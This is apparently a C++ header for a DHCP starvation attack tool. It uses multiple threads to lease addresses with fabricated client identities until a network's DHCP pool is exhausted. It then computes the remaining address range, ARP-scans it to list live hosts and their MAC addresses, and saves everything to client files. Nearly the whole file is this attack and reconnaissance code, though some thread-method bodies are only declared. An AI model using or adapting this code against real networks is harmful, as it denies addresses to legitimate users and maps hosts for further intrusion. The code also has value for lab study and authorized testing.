#pragma once

#include <linux/filter.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>

#include <vector>
#include <thread>
#include <mutex>
#include <algorithm>
#include <chrono>

#include <Utils.h>
#include <Packet.h>

#define IPV4_IHL_OFFSET 0
#define IPV4_PROTOCOL_OFFSET 9
#define IPV4_SRC_OFFSET 12
#define IPV4_DST_OFFSET 16

#define UDP_SRC_PORT_OFFSET 0
#define UDP_DST_PORT_OFFSET 2

#define DHCP_OPCODE_OFFSET (UDP_HDR_LENGTH + 0)
#define DHCP_CHADDR_OFFSET_HI (UDP_HDR_LENGTH + 28)
#define DHCP_CHADDR_OFFSET_LO (UDP_HDR_LENGTH + 30)

#define SNAPSHORT_LENGTH 0xFFFF

#define FAILURE 0xFFFE
#define SUCCESS 0xFFFF

#define IPV4_ID 777
#define IPV4_TTL 64
#define DHCP_ID 777

#define MAX_DHCP_DISCOVER_ATTEMPTS 4
#define MAX_DHCP_REQUEST_ATTEMPTS 4
#define MAX_ARP_REQUEST_ATTEMPTS 6

#define THREADS 10

struct DHCPSTARVATION;

struct DHCPCLIENTS{
    
    struct CLIENT{

        uint32_t iaddr;
        uint8_t haddr[6];

        CLIENT():iaddr(0),haddr{0}{}

        CLIENT(uint32_t _iaddr,uint8_t* _haddr = nullptr):iaddr(_iaddr),haddr{0}{
            if(_haddr){
                memcpy(haddr,_haddr,sizeof(haddr));
            }
        }
    };

    uint32_t siaddr;
    std::vector<CLIENT> vclients;

    DHCPCLIENTS() = default;
    
    DHCPCLIENTS(const char* path){
        load(path);
    }

    CLIENT& emplace_back(uint32_t iaddr,uint8_t* haddr = nullptr){
        return vclients.emplace_back(iaddr,haddr);
    }

    CLIENT& front(){
        return vclients.front();
    }

    CLIENT& back(){
        return vclients.back();
    }

    auto begin(){
        return vclients.begin();
    }

    auto end(){
        return vclients.end();
    }

    size_t size(){
        return vclients.size();
    }

    CLIENT& operator[](size_t index){
        return vclients[index];
    }

    void print(){
        if(!vclients.size()) return;

        size_t index = 0;
        for(auto& client : vclients){
            printf("%lu - ",index++);
            printf("IP: %s ",sprint_ipv4(&client.iaddr));
            printf("MAC: %s\n",sprint_mac(client.haddr));
        }
    }

    void save(const char* path){
        
        if(!path || !vclients.size()) return;

        FILE* file = fopen(path,"wb");

        if(file != nullptr){
            
            fwrite(&siaddr,sizeof(siaddr),1,file);

            size_t size = vclients.size();
            fwrite(&size,sizeof(size),1,file);

            for(auto& client : vclients){
                fwrite(&client.iaddr,sizeof(client.iaddr),1,file);
                fwrite(client.haddr,sizeof(client.haddr[0]),sizeof(client.haddr),file);
            }

            fclose(file);
        }
        else{
            printf("fopen failed -> %s\n",strerror(errno));
        }
    }

    void load(const char* path){
        if(!path) return;

        FILE* file = fopen(path,"rb");

        if(file != nullptr){
            
            fread(&siaddr,sizeof(siaddr),1,file);

            size_t size = 0;
            fread(&size,sizeof(size),1,file);

            vclients.reserve(size);

            while(size--){
                CLIENT& client = vclients.emplace_back();

                fread(&client.iaddr,sizeof(client.iaddr),1,file);
                fread(client.haddr,sizeof(client.haddr[0]),sizeof(client.haddr),file);
            }

            fclose(file);
        }
        else{
            printf("fopen failed -> %s\n",strerror(errno));
        }
    }


};

struct THREADCONTEXT{

    DHCPSTARVATION* starvation;

    int sock;
    
    sockaddr_ll saddr;
    sockaddr_ll daddr;

    int discover_attempts;
    int request_attempts;

    uint8_t chaddr[6];
    uint32_t* chaddr_host;

    DHCP::HDR hdr;

    std::chrono::seconds::rep start;

    THREADCONTEXT(DHCPSTARVATION* _starvation);

    ~THREADCONTEXT(){
        if(sock >= 0) close(sock);
    }

    void configure_socket_address();

    void configure_socket();

    int discover();
    int offer();
    int request();
    int ack();
    int dora();

    void execute();
};

struct DHCPSTARVATION{
    Interface interface;

    DHCPCLIENTS fclients;
    DHCPCLIENTS tclients;
    DHCPCLIENTS aclients;

    uint32_t netmask;
    uint32_t subnetwork;
    uint32_t hostmask;
    uint32_t siaddr;

    size_t max_hosts;
    size_t host_count;

    std::vector<std::thread> threads;
    std::mutex mutex;

    DHCPSTARVATION(const char* interface_name){
        interface.init(interface_name);

        netmask = ntohl(interface.in_prefix_length ? ((0x01 << interface.in_prefix_length) - 0x01) : 0);
        subnetwork = ntohl(interface.in_addr) & netmask;
        hostmask = ~netmask;
        siaddr = htonl(subnetwork | 1);

        fclients.siaddr = siaddr;
        tclients.siaddr = siaddr;
        aclients.siaddr = siaddr;

        max_hosts = hostmask ? hostmask + 1 : 0;
        host_count = 0;
    }

    uint32_t get_host(){
        uint32_t count = 0;
        mutex.lock();
        count = host_count;
        if(host_count < max_hosts) host_count++;
        mutex.unlock();
        return count;
    }

    void fclients_lease_thread(){
        THREADCONTEXT ctx(this);
        ctx.execute();
    }

    void load_fclients(){
        host_count = 0;

        for(int i = 0; i < THREADS; ++i){
            threads.emplace_back(&DHCPSTARVATION::fclients_lease_thread,this);
        }

        for(auto& thread : threads){
            if(thread.joinable()){
                thread.join();
            }
        }

        std::sort(fclients.begin(),fclients.end(),[](DHCPCLIENTS::CLIENT& c1,DHCPCLIENTS::CLIENT& c2){
            return c1.iaddr < c2.iaddr;
        });

        fclients.save("./Clients/fclients.cli");
    }

    void load_tclients(){
        if(!fclients.size()) return;

        uint32_t first = 0;
        uint32_t last = 0;
        uint32_t min_host = UINT32_MAX;
        uint32_t max_host = 0;

        for(auto& fclient : fclients.vclients){
            uint32_t host = ntohl(fclient.iaddr) & hostmask;
            min_host = (host < min_host) ? host : min_host;
            max_host = (host > max_host) ? host : max_host;
        }

        min_host -= min_host % 100;
        max_host -= max_host % 100;
        max_host += 99;
        max_host = (hostmask < max_host) ? hostmask : max_host;

        first = min_host;
        last = ntohl(fclients.front().iaddr) & hostmask;

        for(uint32_t i = first; i < last; ++i){
            tclients.emplace_back(htonl(subnetwork | i));
        }

        for(auto& fclient : fclients.vclients){
            uint32_t current = ntohl(fclient.iaddr) & hostmask;
            int64_t len = current - last;
            while(--len > 0){
                tclients.emplace_back(htonl(subnetwork | ++last));
            }
            last = current;
        }

        first = ntohl(fclients.back().iaddr) & hostmask;
        last = max_host;

        for(uint32_t i = first; i < last; ++i){
            tclients.emplace_back(htonl(subnetwork | i));
        }

        tclients.save("./Clients/tclients.cli");
    }

    void load_aclients(){
        if(!tclients.size()) return;

        int sock = socket(AF_PACKET,SOCK_DGRAM,htons(ETH_P_ARP));
        if(sock == -1){
            printf("function: %s line: %d socket: %s\n",__func__,__LINE__,strerror(errno));
            exit(1);
        }

        timeval tv;
        tv.tv_sec = 2;
        tv.tv_usec = 0;
        if(setsockopt(sock,SOL_SOCKET,SO_RCVTIMEO,&tv,sizeof(tv)) == -1){
            printf("function: %s line: %d setsockopt: %s\n",__func__,__LINE__,strerror(errno));
            exit(1);
        }

        uint8_t broadcast_haddr[6] = {0xff,0xff,0xff,0xff,0xff,0xff};

        sockaddr_ll daddr = {0};
        daddr.sll_family = AF_PACKET;
        daddr.sll_protocol = htons(ETH_P_ARP);
        daddr.sll_ifindex = interface.index;
        daddr.sll_hatype = HARDWARE_ETHERNET;
        daddr.sll_halen = MAC_ADDRESS_LENGTH;
        memcpy(daddr.sll_addr,broadcast_haddr,daddr.sll_halen);

        ARP sender_arp;
        ARP receive_arp;

        for(auto& tclient : tclients.vclients){

            if(tclient.iaddr == interface.in_addr){
                aclients.emplace_back(interface.in_addr,interface.haddr);
                continue;
            }

            sender_arp.write_hdr(ARP_REQUEST,interface.haddr,interface.in_addr,nullptr,tclient.iaddr);

            int state = ARP_REQUEST;
            int arp_request_attempts = MAX_ARP_REQUEST_ATTEMPTS;
            bool runner = true;

            while(runner){

                switch(state){
                    case ARP_REQUEST:{
                        if(sendto(sock,sender_arp.data(),sender_arp.length(),0,(sockaddr*)&daddr,sizeof(daddr)) == -1){
                            printf("function: %s line: %d sendto: %s\n",__func__,__LINE__,strerror(errno));
                            runner = false;
                        }
                        else{
                            state = ARP_REPLY;
                        }
                        break;
                    }
                    case ARP_REPLY:{
                        ssize_t r = recv(sock,receive_arp.data(),receive_arp.capacity(),0);

                        if(r == -1){    
                            if(arp_request_attempts-- == 0){
                                runner = false;
                            }
                            else{
                                state = ARP_REQUEST;
                            }
                        }
                        else{
                            receive_arp.set_length(r);
                            ARP::HDR hdr = receive_arp.read_hdr();

                            if(hdr.op != ARP_REPLY) break;

                            if(hdr.htype != HARDWARE_ETHERNET || hdr.ptype != ETHERNET_IPV4) break;

                            if(hdr.hlen != MAC_ADDRESS_LENGTH || hdr.plen != IPV4_ADDRESS_LENGTH) break;

                            if(tclient.iaddr != hdr.siaddr) break;

                            if(memcmp(interface.haddr,hdr.thaddr,sizeof(interface.haddr)) || interface.in_addr != hdr.tiaddr) break;

                            aclients.emplace_back(tclient.iaddr,hdr.shaddr);

                            runner = false;
                        }
                        break;
                    }
                    default:{
                        runner = false;
                        break;
                    }
                }
            }
        }

        close(sock);

        aclients.save("./Clients/aclients.cli");
    }
    
    void execute(){
        load_fclients();
        load_tclients();
        load_aclients();

        printf("\nfclients: %lu tclients: %lu aclients: %lu\n",fclients.size(),tclients.size(),aclients.size());
        
        printf("\nFalse Clients\n");
        fclients.print();
        
        printf("\nTrue Clients\n");
        tclients.print();
        
        printf("\nActive Clients\n");
        aclients.print();
    }
};